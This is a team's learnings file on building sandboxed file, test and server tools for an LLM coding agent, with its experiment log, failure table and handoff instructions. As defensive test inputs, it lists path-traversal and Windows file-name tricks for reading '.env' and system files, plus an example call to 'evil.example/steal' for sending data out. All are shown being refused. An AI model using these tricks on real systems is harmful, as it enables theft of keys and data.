# W2 — Runtime, tools and safety: learnings

Owner: Bernard

> The rest of the team will NOT read your code. They will write the report, present, and answer viva questions using only this file. Explain it like you are talking to someone who has never coded. Every option you tried goes in the log.

## 1. What this part does, in one paragraph

An LLM can only write text. It cannot save a file, run a test or call a website. **Tools** are ordinary Python functions on our computer that do those things for it. The LLM writes a request such as "use `write_file` with path `app.py` and this content". The agent program (Alice's part) runs the matching function and sends the answer back to the LLM as text. W2 builds those functions and keeps them safe:
- they only touch files inside the project folder;
- they never show the API key;
- they cut long output so it does not waste tokens;
- they stop anything that runs too long.

Stage 1 so far (task S1.1) gives **eight tools**, all in one file, `runtime/tools.py`:

| Tool | Does |
|---|---|
| `write_file` | Creates or replaces a file in the project |
| `read_file` | Reads a file in the project |
| `edit_file` | Replaces one exact piece of text in a file |
| `list_files` | Lists the project's files |
| `run_tests` | Runs the project's tests |
| `start_server` | Starts the backend the agent wrote |
| `http_request` | Calls that running backend |
| `stop_server` | Stops it |

Every tool answers in the same shape: `{"ok": true or false, "output": "text for the LLM"}`. The sandbox (S1.2) comes next: the locked box that the tests and the server will run inside.

## 2. How it works, step by step

A real run on the church example. The church app (`benchmark/church_signup/reference/app.py`) was given an off-by-one bug: a full event still accepted one more person. These are the exact answers the tools gave (`root` is the project folder):

1. **The agent looks at the project.** `list_files(root)` → `{"ok": true, "output": "app.py\ntests/test_app.py"}`
2. **A tricked LLM tries to read the key.** `read_file(root, "../.env")` → `{"ok": false, "output": "Refused: '../.env' is outside the project folder"}`. How: `safe_path` asks the computer where `../.env` really is. That place is outside the project folder, so it is refused (log row 1).
3. **The agent runs its tests.** `run_tests(root)` runs `pytest` in a separate process, with a 60-second limit and without the API key in its settings. It ends with:
   ```
   FAILED tests/test_app.py::test_full_event_refuses_sign_up - assert 201 == 409
   1 failed, 7 passed, 1 warning in 1.30s
   ```
   `ok` is `false`. The output was cut to at most 4,000 characters, keeping the start and the end, so this summary at the end is always there (log row 5).
4. **The agent fixes one line.** `edit_file(root, "app.py", '> event["max_people"]', '>= event["max_people"]')` → `"Wrote 1407 characters to app.py"`. The LLM only had to write about 40 characters, not the whole 1,407-character file (log row 3).
5. **Tests again.** `run_tests(root)` → `{"ok": true, "output": "8 passed, 1 warning in 1.12s"}`
6. **The agent starts the backend.** `start_server(root)` → `"Server running at http://127.0.0.1:56249"`. The port is a free one picked by the computer (log row 7). The tool asks the server every 0.1 s until it answers, about 2 seconds on this laptop (log row 8).
7. **The agent tries it.** `http_request(root, "POST", "/church-events", {"title": "Harvest day", "date": "2026-11-20", "max_people": 1})` → `"201\n{"id":1,"title":"Harvest day","date":"2026-11-20","max_people":1}"`. The first line is the status code, then the reply.
8. **A tricked LLM tries to send data to another website.** `http_request(root, "GET", "http://evil.example/steal")` → refused: the path must start with `/`, and it is always added to our own server's address.
9. **Done.** `stop_server(root)` → `"Stopped the server at http://127.0.0.1:56249"`. Any server still running when the program ends is stopped automatically.

```
LLM ──"use run_tests"──▶ agent program (Alice) ──run_tests(root)──▶ runtime/tools.py ──▶ pytest (own process, 60 s limit, no key)
LLM ◀──"1 failed … assert 201 == 409"── agent program ◀──{"ok": false, "output": …}── runtime/tools.py
```

## 3. Everything we tried (experiment log)

One row per decision. Every decision compares at least 2 options. Add rows as you go, not at the end.

| # | Question | Options compared | How we tested it | Results (numbers) | Winner and why |
|---|---|---|---|---|---|
| 1 | How do the file tools stop the agent touching files outside its project folder? | A: look at the text of the path and refuse `..`, `/`, `:`, `.env`, `.git` · B: let the computer work out where the path really ends up, then check it is inside the project | The same 24 paths given to both: 6 good ones and 18 attacks (`../secret.txt`, `C:\Windows\win.ini`, a folder link pointing outside, `.ENV` in capitals, `.env::$DATA`, a 5,000-letter path, a hidden zero character…). Throwaway project with a fake `.env` and a real Windows folder link. `runtime/experiments/path_guard.py`, output in `runtime/experiments/results/path_guard.txt` | A: **5 attacks let through** (including reading a secret through the folder link, and `.ENV`), 2 good files wrongly refused (`my..notes.txt`, `envelope/.environment.txt`). B, first try: 0 refused wrongly, 1 let through (the 5,000-letter path). B after adding a 255-letter limit: **0 and 0** | B: it checks where the file really is, not what the name looks like, so tricks with links, capitals and dots do not work |
| 2 | Should `list_files` show a flat list of paths or an indented tree? | Flat (`routers/events.py` on each line) · tree (folder name once, files indented under it) | Both formats on the church reference (2 files) and a typical 12-file FastAPI project. `runtime/experiments/file_tools.py`, output in `runtime/experiments/results/file_tools.txt` | Church: 15 vs 15 characters. 12 files: flat 182, tree 168 (tree 8% shorter) | Flat: the saving is tiny, and every flat line is a full path the LLM can copy straight into `read_file`. With a tree it must glue folder and file names together itself, one more chance to get it wrong |
| 3 | To change a few lines, should the LLM resend the whole file or only the changed piece? | `write_file` (whole new file) · `edit_file` (old piece + new piece) | 3 typical fixes on the church `app.py` (change a status code, add a field, sort a list). Counted the characters the LLM has to write. Same script as row 2 | `write_file` 4,271 characters (~1,067 tokens, $0.021) · `edit_file` 284 characters (~71 tokens, $0.0014): **11–23x fewer** per fix | Keep both: `edit_file` for small fixes, `write_file` for new files. Whether the LLM actually uses `edit_file` well is tested later with the agent loop (Alice, S3) |
| 4 | Does `read_file` need a "read lines 50–100" option? | Whole file (cut to 4,000 characters) · line ranges | Measured every Python file in `benchmark/` against the 4,000 limit. Same script as row 2 | Largest is 2,588 characters (the hidden tests); `app.py` is 1,407. All fit | Whole file: simpler for the LLM and for us. If generated files ever pass 4,000 characters, the start and end are still shown and line ranges can be added then |
| 5 | How much of a long tool output should the LLM get back, and which part? | Limit 2,000 / 4,000 / 8,000 characters × keep the start and the end / keep only the start | 7 bugs planted in the church app (wrong status code, off-by-one capacity check, syntax error, import typo, wrong URL, renamed field, a debug print of 75,000 characters), run against 8 agent-style tests. For each cut output: can the LLM still see the summary line, every failing test's name, and the words saying what is wrong? 7 bugs × 3 facts = 21. `runtime/experiments/output_limit.py`, output in `results/output_limit.txt` | Start and end: **21/21 at every limit**. Start only: 14–20/21, because pytest prints its summary at the very end. Without any cut, the debug-print bug gives 151,259 characters (about 38,000 tokens) in one reply | Start and end, 4,000 characters. 2,000 already scored 21/21, but the end half must hold the whole failure list (about 90 characters per failing test): 2,000 fits about 11 failing tests, 4,000 about 22, for about 160 more tokens per call |
| 6 | How much detail should pytest print for each failure? | `--tb=long` (whole test function) · `--tb=short` (the failing line and its error) · `--tb=line` (one line per failure) | Same 7 bugs and the same 21-fact score as row 5 | Full size for the wrong-status bug: long 4,859, short 3,167, line 2,218 characters. All three: 21/21 facts | `short`: about 35% smaller than long. `line` is about 30% smaller again but drops the line of test code that failed, which this score cannot measure. Revisit if Alice's repair experiments show `line` fixes bugs just as well |
| 7 | Which port should a generated backend's server use? | Always 8001 · a free port the operating system picks each time | Started two church projects at the same moment. `runtime/experiments/server_start.py`, output in `results/server_start.txt` | Fixed 8001: the second server **died** ("address already in use"). Free port: both ran (ports 62430 and 62436) | Free port: builds can run side by side (Joseph's harness, two users) and never clash with something already on 8001 |
| 8 | How does `start_server` know the server is ready? | Sleep 1 s · sleep 2 s · ask every 0.1 s with a 1 s connect limit · ask every 0.1 s with a 0.1 s connect limit · watch uvicorn's log for "Application startup complete" | 10 starts each of the church app, timed from launch to the first good request. Same script as row 7 | All 10/10. Median seconds: 1.54 / 2.51 / 2.52 / **2.26** / 2.04. The app needs about 2 s to start on this laptop. "Sleep 1 s" only worked because Windows keeps retrying a connection for a while | Ask with a 0.1 s connect limit. A fixed sleep is a guess that breaks on a slower machine or in Docker. Watching the log is 0.2 s faster but depends on uvicorn's exact wording. Asking tests the real thing: does it answer? |
| 9 | When tests fail, does putting a one-line reason first help the LLM fix the bug? | A: pytest's output as it is (cut to 4,000) · B: the `FAILED …` lines and the summary line copied to the top, then the full output | The 7 planted bugs × 2 formats × 3 repeats = 42 calls to `claude-opus-5-5` (effort `low`). Each call got `app.py`, the tests and the `run_tests` output, and was asked for the fixed `app.py`. We then ran the tests again. Fixed = all 8 pass. `runtime/experiments/error_format.py`, output in `results/error_format.txt`. **Cost $0.85** | A: **21/21 fixed**, 609 output tokens on average, $0.43 · B: **21/21 fixed**, 582 tokens, $0.42 | A, the raw output: no difference was measured, and B needs extra code. These bugs were easy once the LLM saw the whole file. A harder test (many files, no file contents in the prompt) may show a difference later, with Alice's agent loop |

## 4. What we chose, and why

- **Every file path is checked by finding where it really ends up**, then making sure that is inside the project. `.env`, `.git`, colons and paths over 255 letters are refused. Row 1, decision 0022.
- **File tools:** a flat file list, whole-file reads, and `edit_file` next to `write_file`. Rows 2–4, decision 0023.
- **All tool output is cut to 4,000 characters, keeping the start and the end.** `run_tests` uses `pytest -q --tb=short`. Rows 5–6, decision 0024.
- **`start_server` uses a free port and asks every 0.1 s until the server answers.** `http_request` can only reach that server. Rows 7–8, decision 0025.
- **Failing tests are reported exactly as pytest prints them**, with no reformatting. Row 9, decision 0026.
- **Generated code never gets our settings**: tests and servers start with only `PATH`, `SYSTEMROOT`, `TEMP`, `TMP` and `PYTHONUTF8`, so the API key is not there (tested).

## 5. What breaks, and the limits

Every failure case below was run. Each is a test in `runtime/tests/` (44 tests, all passing).

| Failure case | What happens |
|---|---|
| Path outside the project (`../x`, `C:\...`, `/etc/passwd`, `\\server\share`, a folder link pointing out) | `Refused: … is outside the project folder` |
| `.env` or `.git` in any spelling (`.ENV`, `.env.`, `.env::$DATA`, `sub/.env`) | `Refused: … is a protected file` |
| Empty path, a path over 255 letters, a hidden zero character, a colon | `Refused: … is not a valid project path` |
| Reading a missing file / a picture or other binary file | `No such file: …` / `Refused: … is not a text file` |
| Reading a 10 MB file | Start and end shown, middle cut, under 4,100 characters |
| Writing 10 million characters | Refused (limit 200,000), nothing written |
| Writing onto a folder | `Refused: tests is a folder, not a file` |
| `edit_file` when the old text appears 0 times or several times | `Not changed: … found N times …; it must be found exactly once` |
| A test that loops forever | Stopped after the limit: `Tests stopped: still running after 60 seconds …` |
| A test that prints 75,000 characters | Cut to under 4,100 characters; the summary is still there |
| Generated code looking for `LLM_API_KEY` | Not there: tests and servers get only `PATH`, `SYSTEMROOT`, `TEMP`, `TMP` and `PYTHONUTF8` |
| An app that crashes on start (import typo), or has no `app.py` | `Server crashed while starting:` plus uvicorn's error |
| An app that never answers | `Server did not answer within 20 seconds`, then it is killed |
| An endpoint that hangs | `No answer within 10 seconds` |
| An endpoint that kills the server | `The server has stopped. Its log: …` |
| A 1 MB reply or a plain-text reply | Cut / shown as is |
| `http_request` to another website (`http://…`, `example.com`, `@example.com`) | Refused. `//example.com` is allowed but goes to **our** server (404), because the path is always added to `http://127.0.0.1:PORT` |
| Two projects started at once | Each gets its own free port |

**Limits (honest list):**
- **There is no sandbox yet.** Tests and servers run on this computer as normal programs. The cleaned settings hide the key, but generated code could still read other files, use the network or use all the memory. S1.2 fixes this with Docker.
- **One unexplained hang.** The very first `run_tests` on the syntax-error bug ran into the 60-second limit. 16 more tries took about 3 seconds each, and I could not make it happen again. My guess is Windows scanning brand-new files. The time limit is what caught it.
- **Only tested on Windows 11** with Python 3.14. Linux (Docker) comes in S1.2.
- **Not yet tested with a real agent:**
  - whether the LLM actually uses `edit_file` well;
  - whether `--tb=line` would be enough;
  - which set of tools is best: six, six plus `edit_file`, or one "run any command" tool.
  These need Alice's agent loop (S3).
- A colon is never allowed in a file name. Python projects don't need one.
- The list of running servers lives in memory. If the agent program crashes hard, its servers are stopped on exit, but a hard kill could leave one running.

## 6. How to run it, and how the next person uses it

**Set up and check** (from the repo root; Windows notes in `knowledge/environment.md`):
```
uv sync
uv run pytest runtime -q          # expect: 44 passed (about 1 minute)
```

**Re-run the experiments** (all free, except `error_format.py`, which costs about $0.85):
```
uv run python runtime/experiments/path_guard.py      # log row 1
uv run python runtime/experiments/file_tools.py      # rows 2-4
uv run python runtime/experiments/output_limit.py    # rows 5-6
uv run python runtime/experiments/server_start.py    # rows 7-8
uv run --env-file .env --with anthropic python runtime/experiments/error_format.py   # row 9, needs the key
```
Results are saved in `runtime/experiments/results/`.

**What you get: `runtime/tools.py`.** Import the functions and pass the project folder first. The LLM chooses only the other arguments; your program always sets `root`.

| Function | Arguments the LLM fills in | `ok` is `true` when | `output` |
|---|---|---|---|
| `write_file(root, path, content)` | `path`, `content` | the file was written | `Wrote N characters to path` |
| `read_file(root, path)` | `path` | the file was read | the file's text |
| `edit_file(root, path, old, new)` | `path`, `old`, `new` | `old` was found exactly once and replaced | `Wrote N characters to path` |
| `list_files(root)` | — | always | one path per line, or `(no files yet)` |
| `run_tests(root, path="tests", timeout=60)` | `path` (optional) | **all tests passed** | pytest's output |
| `start_server(root, timeout=20)` | — | the server answered | `Server running at http://127.0.0.1:PORT` |
| `http_request(root, method, path, json=None, timeout=10)` | `method`, `path`, `json` | any reply came back (even 404 or 500) | status code, a new line, then the reply body |
| `stop_server(root)` | — | a server was stopped | `Stopped the server at …` |

Rules that hold for every tool:
- Every tool returns `{"ok": bool, "output": str}`.
- It never raises an error.
- `output` is at most about 4,100 characters.
- On failure, `output` starts with the reason.

Example (copy and run from the repo root):
```python
from runtime.tools import write_file, run_tests, start_server, http_request, stop_server

root = "projects/church_demo"        # projects/ is git-ignored
write_file(root, "app.py", open("benchmark/church_signup/reference/app.py").read())
result = start_server(root)
print(result)                        # {'ok': True, 'output': 'Server running at http://127.0.0.1:61772'}
base_url = result["output"].split()[-1]               # the URL by itself, e.g. for BASE_URL in the hidden tests
print(http_request(root, "GET", "/church-events"))   # {'ok': True, 'output': '200\n[]'}
print(stop_server(root))
```

**For Joseph (S2.3, the harness):**
1. Run `start_server(root)` and take the URL from the end of `output`.
2. Set `BASE_URL` to it and `OPS_FILE` to the project's `ops.json`, then run the hidden tests as in `knowledge/environment.md`.
3. Call `stop_server(root)` at the end.

`start_server` expects `app.py` with an object called `app` in the project folder.

**For Alice (S3, the agent):** give the LLM one tool definition per row of the table above, using each function's docstring as its description. Call the function with `root` plus the LLM's arguments, and send `output` back as the tool result. Mark it as an error when `ok` is false.

**Don't:**
- let the LLM choose `root`;
- pass the real environment to generated code;
- run generated code without these tools, and from S1.2, without the sandbox.

## 7. Viva questions you should be able to answer

| Question | Answer |
|---|---|
| Who actually writes the file when the LLM "uses `write_file`"? | Our Python function does. The LLM only writes a request (tool name plus arguments). The agent program calls the function and sends `{"ok", "output"}` back to the LLM as text |
| How do you stop the agent reading `../.env`? | `safe_path` asks the operating system for the real final path, then checks it is inside the project folder. Checking the text alone let 5 of 18 attacks through, for example a folder link and `.ENV` in capitals; this way let 0 through (row 1) |
| Why is `.ENV` dangerous on Windows? | Windows ignores capital letters, trailing dots and `::$DATA` in file names, so `.ENV`, `.env.` and `.env::$DATA` all open `.env`. We lower-case the name, strip dots and spaces, and ban colons |
| Why cut tool output, and why keep the end? | Every reply is re-sent to the LLM on every later step, so long replies cost tokens many times over. One debug print gave 151,259 characters, about 38,000 tokens. pytest prints its summary at the end: keeping only the start lost up to 7 of 21 key facts; keeping start and end lost none (row 5) |
| Why 4,000 characters and not 2,000? | Both kept all 21 facts. But the end half must hold the list of failing tests, about 90 characters each: 4,000 fits about 22, 2,000 only about 11, for about 160 extra tokens |
| Why have `edit_file` when `write_file` exists? | For a small fix the LLM writes 11 to 23 times fewer characters (output tokens cost $20 per million, 5 times input), and it cannot accidentally change the rest of the file |
| How can generated tests not see the API key? | `run_tests` and `start_server` start their program with only five settings (`PATH`, `SYSTEMROOT`, `TEMP`, `TMP`, `PYTHONUTF8`); a test proves `LLM_API_KEY` is absent |
| What stops a test that never ends? | A time limit (60 s by default). Python's `subprocess.run` kills the program when it is reached, and the LLM is told it was stopped |
| Why a free port instead of 8001? | Two servers on 8001: the second died. A free port lets builds run side by side (row 7) |
| How does `start_server` know the server is ready? | It asks `/openapi.json` every 0.1 s until anything answers. A fixed sleep is a guess that breaks on slower machines (row 8) |
| Can `http_request` be used to send data to another website? | No. The path must start with `/`, and it is always added to `http://127.0.0.1:PORT`. Even `//example.com` reaches our own server |
| What is not safe yet? | Generated code runs as a normal program on the host. It can't see the key, but it could read other files or use the network. That is what the sandbox (S1.2) is for |

## 8. Glossary

Every technical word used above, in one plain sentence each.

- **Environment variable**: a named setting your computer gives every program it starts, such as `PATH` or `PYTHONUTF8`.
- **PATH**: the list of folders the computer searches, in order, when you type a command like `python3`. The first match wins.
- **UTF-8**: the standard way to store text (including emoji and accented letters) as bytes. Windows Python does not assume it unless `PYTHONUTF8=1` is set.
- **Pre-commit hook**: a small script git runs just before saving a commit. Ours refuses keys, `.env`, model files and a stale README.
- **Branch**: a separate line of commits. All of Stage 1 goes on `w2-tools` and is merged into `main` at the handoff.
- **Tool**: a normal function the LLM can ask the agent program to run for it, because the LLM itself can only write text.
- **Project folder (`root`)**: the one folder the agent builds a backend in. The tools never go outside it.
- **Path**: the address of a file, such as `tests/test_app.py`. `..` means "the folder above", so `../.env` points outside the project.
- **Resolve (a path)**: ask the operating system where a path really ends up, after following `..` and links.
- **Folder link (junction, symlink)**: a fake folder that is really a door to another folder somewhere else.
- **`.env`**: the file on our laptop holding the API key. The tools refuse to read, write or list it.
- **Process**: a running program. `run_tests` and `start_server` start a separate process, so a crash or endless loop there cannot freeze the agent.
- **Subprocess**: a process started by our Python program (`subprocess.run` waits for it to end; `subprocess.Popen` lets it keep running, as the server does).
- **Timeout**: the most time we wait before stopping something.
- **pytest**: the Python program that runs tests and prints which passed and which failed.
- **Traceback (`--tb`)**: pytest's printout of where an error happened. `long` shows a lot, `short` the failing line, `line` one line per failure.
- **Server / uvicorn**: uvicorn is the program that runs a FastAPI `app` so it answers web requests.
- **Port**: a number (like 8001) that tells the computer which running program a network request is for. Only one program can use a port at a time.
- **127.0.0.1 (localhost)**: the address meaning "this same computer". A server listening there cannot be reached from other computers.
- **HTTP request / status code**: a message to a web server (`GET` to read, `POST` to create…). The reply starts with a number: 200 OK, 201 created, 404 not found, 409 conflict, 422 bad input, 500 server error.
- **`/openapi.json`**: the description of every endpoint that FastAPI publishes automatically; we use it to check the server is up.
- **Token**: the piece of text an LLM reads or writes, about 4 characters of English or code. API prices are per million tokens.
- **Off-by-one bug**: using `>` where `>=` was needed (or similar), so a limit is wrong by exactly one.
